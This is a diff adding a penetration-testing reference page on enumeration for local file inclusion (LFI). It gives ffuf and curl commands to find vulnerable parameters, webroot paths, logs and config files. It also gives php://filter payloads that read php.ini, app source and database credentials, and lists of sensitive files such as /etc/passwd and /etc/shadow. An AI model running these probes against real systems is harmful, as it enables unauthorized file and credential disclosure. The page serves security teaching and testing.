@@ -1,0 +1,405 @@
+---
+title: Enumeration
+description: Finding LFI parameters, the webroot path, log file locations, and other server-specific paths needed to chain LFI into deeper exploitation.
+mitre: [T1190, T1083]
+d3fend: [D3-FA]
+impact: [FileRead]
+owasp: [A03]
+sidebar:
+  order: 9
+  label: Enumeration
+---
+import { Aside } from '@astrojs/starlight/components';
+
+## TL;DR
+
+Three enumeration phases for LFI work:
+
+```
+# 1. Find vulnerable parameters (often unlinked from HTML forms)
+ffuf -w params.txt:FUZZ -u 'https://target/index.php?FUZZ=test' -fs <baseline_size>
+
+# 2. Find the webroot (for absolute-path inclusions and locating uploaded files)
+ffuf -w webroot-paths.txt:FUZZ -u 'https://target/?page=../../../FUZZ/index.php' -fs <baseline>
+
+# 3. Find logs and config (for log poisoning and server fingerprinting)
+ffuf -w lfi-wordlist.txt:FUZZ -u 'https://target/?page=../../../FUZZ' -fs <baseline>
+```
+
+Success indicator: response size changes when the fuzzer hits a valid parameter, file path, or directory.
+
+## Phase 1 - Finding the vulnerable parameter
+
+LFI hides in parameters that aren't linked from forms. HTML-form parameters tend to be tested better; "internal" / "leftover" parameters often aren't.
+
+### Common LFI-shaped parameter names
+
+```
+page          file           path          template
+include       view           document      content
+load          read           inc           src
+folder        item           pg            cat
+language      lang           locale        country
+theme         style          skin          layout
+display       show           render        partial
+```
+
+### Fuzzing with ffuf
+
+```bash
+# Baseline - get response size for an invalid parameter value
+curl -s 'https://target/index.php?nonexistent=test' | wc -c
+# → 2287
+
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
+     -u 'https://target/index.php?FUZZ=test' \
+     -fs 2287
+```
+
+The `-fs 2287` filter excludes responses matching the baseline size - anything different is a candidate. Adjust the size to match your target.
+
+When the baseline varies request-to-request (e.g., due to a session-id or timestamp in the response), filter by status or word count instead:
+
+```bash
+# Filter by exact word count
+-fw 145
+
+# Filter by line count
+-fl 64
+
+# Match specific status codes
+-mc 200,500
+```
+
+### Hits don't guarantee LFI
+
+A parameter affecting the response means it's *used* - not that it's *vulnerable*. Confirm each hit:
+
+```bash
+# For each interesting parameter
+for param in language theme view file; do
+    curl -s "https://target/index.php?$param=/etc/passwd" | head -c 200
+    echo "---"
+done
+```
+
+A response containing `root:x:0:0:...` confirms LFI on that parameter.
+
+### Beyond GET parameters
+
+Don't limit to GET. Test:
+
+- **POST parameters** - same names, sent as form data
+- **JSON body keys** - `{"page": "/etc/passwd"}`
+- **HTTP headers** - `X-Original-URL`, `X-Forwarded-Path`, `Referer`, custom app-specific headers
+- **Cookies** - sometimes used as templating selectors
+
+Sample header test:
+
+```bash
+ffuf -w common-headers.txt:HEADER \
+     -u 'https://target/' \
+     -H "HEADER: /etc/passwd" \
+     -mr "root:x:0:0"
+```
+
+## Phase 2 - Finding the webroot
+
+Knowing the webroot path is essential for:
+
+- **Reading the source of files you found** by URL but don't know the on-disk path of
+- **Locating uploaded files** when the URL doesn't map cleanly to disk
+- **Constructing absolute paths** when relative paths are blocked
+
+### Common webroot paths
+
+Linux:
+
+```
+/var/www/html/
+/var/www/
+/srv/www/
+/srv/http/
+/usr/share/nginx/html/
+/usr/local/apache2/htdocs/
+/opt/lampp/htdocs/
+/home/<user>/public_html/
+```
+
+Windows:
+
+```
+C:\inetpub\wwwroot\
+C:\xampp\htdocs\
+C:\wamp\www\
+C:\Apache24\htdocs\
+```
+
+### Fuzzing for the webroot
+
+The trick: fuzz the path, looking for the application's own `index.php`. When the LFI sink can load `<webroot>/index.php`, you've found the webroot:
+
+```bash
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
+     -u 'https://target/?page=../../../../FUZZ/index.php' \
+     -fs 2287
+```
+
+Adjust the leading `../../../` count to your knowledge of the LFI depth. When it hits, you'll see the webroot reflected:
+
+```
+/var/www/html/          [Status: 200, Size: ..., Words: ..., Lines: ...]
+```
+
+### From server config
+
+If `php://filter` works, read the server config directly:
+
+```
+?page=php://filter/convert.base64-encode/resource=/etc/apache2/apache2.conf
+?page=php://filter/convert.base64-encode/resource=/etc/nginx/nginx.conf
+```
+
+Look for `DocumentRoot` (Apache) or `root` (Nginx):
+
+```
+DocumentRoot /var/www/html
+```
+
+or
+
+```
+server {
+    listen 80;
+    root /var/www/html;
+}
+```
+
+The config also reveals the log paths and other useful settings - usually the fastest enumeration path when accessible.
+
+### From error messages
+
+Verbose PHP errors often include the full path:
+
+```
+Warning: include(/var/www/html/languages/../etc/passwd): failed to open stream: 
+No such file or directory in /var/www/html/index.php on line 12
+```
+
+The `in /var/www/html/index.php` reveals the webroot.
+
+### Apache environment variables
+
+When the Apache config uses variables (`APACHE_LOG_DIR`), read `envvars`:
+
+```
+?page=php://filter/convert.base64-encode/resource=/etc/apache2/envvars
+```
+
+```
+export APACHE_LOG_DIR=/var/log/apache2
+export APACHE_RUN_USER=www-data
+export APACHE_PID_FILE=/var/run/apache2.pid
+```
+
+## Phase 3 - Finding logs and config
+
+For [log poisoning](/codex/web/lfi/log-poisoning/) and detailed server fingerprinting, you need the log paths.
+
+### LFI-specific wordlists
+
+```bash
+# Comprehensive LFI wordlist with traversal payloads + common files
+/opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt
+
+# Linux-specific file paths
+# https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
+
+# Windows-specific
+# https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows
+```
+
+Usage:
+
+```bash
+ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
+     -u 'https://target/?page=FUZZ' \
+     -fs 2287
+```
+
+The Jhaddix list contains both payloads (traversal variants) and target file paths (`/etc/passwd`, `/etc/shadow`, etc.). Useful for one-shot scanning.
+
+### Targeted log discovery
+
+```bash
+ffuf -w lfi-wordlist-linux.txt:FUZZ \
+     -u 'https://target/?page=../../../../FUZZ' \
+     -fs 2287
+```
+
+Common interesting files this finds:
+
+```
+/etc/hosts
+/etc/hostname
+/etc/issue
+/etc/passwd
+/etc/group
+/etc/crontab
+/etc/sudoers
+/etc/apache2/apache2.conf
+/etc/apache2/sites-enabled/000-default.conf
+/etc/apache2/envvars
+/etc/nginx/nginx.conf
+/etc/nginx/sites-enabled/default
+/etc/php/7.4/apache2/php.ini
+/etc/php/8.1/fpm/php.ini
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+/var/log/auth.log
+/var/log/mail.log
+/var/log/syslog
+/var/log/dpkg.log
+/proc/self/cmdline
+/proc/self/environ
+/proc/self/status
+/proc/version
+```
+
+### Fingerprinting the OS / server software
+
+A few high-information probes:
+
+```
+?page=/etc/os-release                        # Linux distribution
+?page=/etc/issue                             # Login banner with OS version
+?page=/proc/version                          # Kernel version
+?page=/etc/passwd                            # Linux users
+?page=/etc/group                             # Linux groups (reveals service users)
+?page=C:/Windows/win.ini                     # Confirms Windows
+?page=C:/Windows/System32/drivers/etc/hosts  # Windows hosts file
+```
+
+The combination quickly identifies the platform. Once OS-known, narrow the rest of enumeration to OS-specific paths.
+
+### Web app footprinting
+
+Reading the index page source via `php://filter`:
+
+```
+?page=php://filter/convert.base64-encode/resource=index
+```
+
+Parse the decoded source for:
+
+- `include`/`require` references → other PHP files to read
+- Database connection strings → DB credentials
+- API endpoints → other attack surface
+- Hardcoded paths → upload directories, log paths
+- Version comments → framework version for CVE lookup
+
+A few minutes reading the source typically yields enough information to skip the rest of enumeration and head straight for the exploit.
+
+## Automated LFI tools
+
+A few tools attempt to automate the LFI workflow end-to-end:
+
+```
+LFISuite     https://github.com/D35m0nd142/LFISuite
+LFiFreak     https://github.com/OsandaMalith/LFiFreak
+liffy        https://github.com/mzfr/liffy
+```
+
+These tools:
+- Test parameters against common payloads
+- Detect traversal depth automatically
+- Try wrappers (`data://`, `php://filter`) when basic LFI works
+- Sometimes drop a shell automatically
+
+**Quality varies and most are Python 2 / unmaintained.** They miss filter-bypass scenarios that manual testing catches. Useful as a "scan-first" quick check; not a replacement for manual testing.
+
+### When automated tools help
+
+- **Coverage check on many parameters at once** - quickly confirms whether anything is trivially vulnerable
+- **First-pass scanning during reconnaissance** - produces a list of candidate parameters to investigate manually
+- **Lab / CTF environments** - known-vulnerable targets where the automation does work
+
+### When manual is required
+
+- **Filtered or partially-protected applications** - automated tools have fixed payload sets that don't adapt
+- **Non-standard parameter names** - tools test obvious names; unusual ones get missed
+- **Multi-step second-order LFI** - automation can't chain across registration → trigger flows
+
+## Practical workflow
+
+```bash
+# 1. Parameter fuzzing - find the sink
+ffuf -w params.txt:FUZZ -u 'https://target/index.php?FUZZ=test' -fs <baseline>
+
+# 2. Confirm LFI on each candidate
+for p in $candidates; do
+    response=$(curl -s "https://target/index.php?$p=/etc/passwd")
+    echo "$p: $(echo "$response" | grep -c 'root:x:0:0')"
+done
+
+# 3. OS and server fingerprint
+curl -s "https://target/index.php?page=/etc/os-release"
+curl -s "https://target/index.php?page=/proc/version"
+
+# 4. Read PHP config - answers many questions in one shot
+curl -s "https://target/index.php?page=php://filter/convert.base64-encode/resource=/etc/php/7.4/apache2/php.ini" \
+    | grep -oE '[A-Za-z0-9+/=]{200,}' | base64 -d \
+    | grep -E '^(allow_url_include|allow_url_fopen|disable_functions|extension|open_basedir)'
+
+# 5. Read web app config
+curl -s "https://target/index.php?page=php://filter/convert.base64-encode/resource=config" \
+    | grep -oE '[A-Za-z0-9+/=]{200,}' | base64 -d
+
+# 6. Pivot based on what's available
+# - Wrappers? → see /codex/web/lfi/wrappers/
+# - Uploads + LFI? → see /codex/web/lfi/file-upload-chain/
+# - Readable logs? → see /codex/web/lfi/log-poisoning/
+# - Remote URL inclusion? → see /codex/web/lfi/rfi/
+```
+
+## Top-25 LFI parameter names
+
+Based on prevalence across vulnerable applications:
+
+```
+page          file          path          include
+view          item          src           type
+folder        require       inc           document
+template      php_path      doc           pg
+content       url           load          read
+data          conf          dir           link
+```
+
+A focused initial scan on these 25 typically finds the vulnerable parameter within seconds when one exists.
+
+## Detection-only enumeration
+
+When stealth matters, probe sparingly:
+
+```bash
+# One-shot probe of the most likely candidates
+for p in page file path view template lang language; do
+    curl -s -o /dev/null -w "$p: %{http_code} %{size_download}\n" \
+         "https://target/index.php?$p=/etc/passwd"
+done
+```
+
+Compare response sizes - the one returning a noticeably larger or different-sized response is the candidate. Then commit to a single confirmation request rather than mass-fuzzing.
+
+## Notes
+
+- **Baseline-size filtering depends on stable responses.** When response sizes vary naturally (rotating ads, timestamps, session IDs), `-fs` is unreliable. Switch to line/word count or regex match.
+- **`php://filter` accelerates everything else.** Once you can read source, you discover most other paths without further fuzzing. Read the PHP config, web server config, and app `config.php` first - they tell you what you need.
+- **The webroot fuzz works best with a known relative depth.** When you've inferred the LFI depth from an error message, set the leading `../` count exactly and the webroot fuzz returns a single clean hit. Generic excess `../` (8-10) works but produces noisier results.
+- **OS detection narrows the scope by 50%.** Don't fuzz Linux paths against a Windows target - they all return identical empty responses, polluting the result set.
+
+<Aside type="tip">
+The single highest-value enumeration step on any PHP LFI: read `php.ini` via `php://filter`. The PHP configuration file tells you whether wrappers work, whether RFI is open, which extensions are loaded, where logs go, and what's restricted. One request, dozens of answers.
+</Aside>
